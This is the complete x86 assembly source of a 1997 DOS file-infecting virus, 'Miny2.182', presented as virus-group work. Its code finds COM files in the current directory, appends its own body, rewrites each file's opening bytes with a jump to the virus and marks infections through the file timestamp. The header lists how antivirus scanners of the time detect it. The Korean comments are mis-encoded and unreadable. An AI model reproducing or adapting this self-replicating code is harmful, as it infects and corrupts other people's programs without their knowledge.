;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                                                               CVC #02  97/09
; Virus Name : Miny2.182
; Original Author : KOV (Knight Of Virus) of SVS,COREA
; Author : Osiris of CVC,COREA
; Date : 1997/08/17
;
; Type : Non-resident COM infector
;
; ���w���w �����w �a����a���a. Miny2 ���i�i ���a��Q�iЁ�� ���a�� �e�eҁ ��
; �e �����i Ж�a.
; Miny2 �����a�� ���w���a����a�� �a��a������i �a�ᦅ�A�A �� �������a �e�a.
;
; �a�w �e�e�e ���w�������w �a����a�� ���s���a.
; �a�q�� �{�e ���A�񷡷��a.
;
; 1. �A�� �១�i �a�� �g�v�a.
; 2. TBSCAN �� �������ẃ��A �񬂷��E�a.
; 3. COM �¸w�a�i �a�� EXE �a���� �q�q ���a �៥�a.
;
; ���� ���A��e ���� �����i Miny2 �A�� ����Ё �a�i �����a.
;
; AVP 970812 : PS-MPC based
; FINDVIRU 7.73 : VCLb
; F-PROT 2.72a,PCSCAN 315,V3,SCAN 9708 : ���e ���q
; TBAV : Howard
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
            .MODEL  TINY
            .CODE

 Miny2:     nop                         ; �a�A���t (�a������ �e�e�a.)
            nop                         ; �|���� ������ �a����a�a �a�A�A��
            nop                         ; �����A �� �t�i �����a.
 start:
            call  Next                  ;
 Next:      pop   bp                    ;
            sub   bp,offset Next        ; BP = �a����a ���b����

            lea   si,COM_head[BP]       ;
            mov   di,100h               ; COM �� �|�����i �����e�a.
            push  di                    ;
            movsw                       ;
            movsb                       ;

            mov   cx,0080h              ; DTA �� �a�wЁ PSP �a �a�A�A�a��
            mov   si,0080h              ; �q�� ��w�e�a.
            lea   di,End_Virus[BP]      ;
            repz  movsb                 ;

            mov   ah,4Eh                ; �a�� �x��
            mov   cx,00100011B
            lea   dx,Match_COM[BP]
 Find:      int   21h
            jnc   ChkInfected           ;
 Restart:
            lea   si,End_Virus[BP]      ; ���� DTA ����
            mov   di,0080h
            mov   cx,0080h
            repz  movsb
            RET

 ChkInfected:                           ; �q�q �a���i �·��e�a.
            mov   al,DS:[0096h]         ; 62 �� ���� ��a�e�a.
            and   al,1Fh
            cmp   al,1Fh
            jnz   Infect
            mov   ah,4Fh                ; �a�q �a�� �x��
            jmp   Find
 Infect:
            mov   ax,4301h              ; ����/�a�� �����a�� �a��
            xor   cx,cx
            mov   dx,009Eh
            int   21h

            mov   ax,3D02h              ; �a�� ���e
            int   21h

            xchg  ax,bx                 ; �a�� Ѕ�i �苡

            mov   ax,5700h              ; �a�� �b�� ���e �苡
            int   21h

            push  cx                    ; �b�� ���e ��w
            push  dx                    ;

            mov   ah,3Fh                ; �|���� ����
            lea   dx,COM_Head[BP]       ; ���� ����
            mov   cx,0003               ; 3 �a���a
            int   21h

            mov   al,02                 ; �a�� �{�a�� ����
            call  lseek

            sub   ax,3                  ; ���a�t ���e
            mov   word ptr JumpCode[BP+1],ax     ;

            mov   ah,40h                ; �a����a �a��
            mov   cx,offset End_virus - 3 - 2
            lea   dx,start[BP]
            int   21h

            mov   al,00                 ; ��q�a�� ����
            call  lseek

            mov   ah,40h                ; ���a š�a �a��
            mov   cx,0003
            lea   dx,JumpCode[BP]
            int   21h

            pop   dx                    ; �a�� �b�� ���e ����
            pop   cx                    ;
            or    cx,+1Fh               ; 62 ���� �e�i��
            mov   ax,5701h              ;
            int   21h

            mov   ah,3Eh                ; �a�� �h��
            int   21h
            jmp   Restart


 lseek:                                 ;
            xor   cx,cx
            xor   dx,dx
            mov   ah,42h
            int   21h
            ret

 COM_head   db    0CDh,20h,90h          ; COM �|����
 Match_COM  db    '*.com',00            ; COM �a�� �x��
            db    'Miny2'               ; ���� 2
 JumpCode   db    0E9h
            db    ?,?
 End_Virus:

            END   Miny2

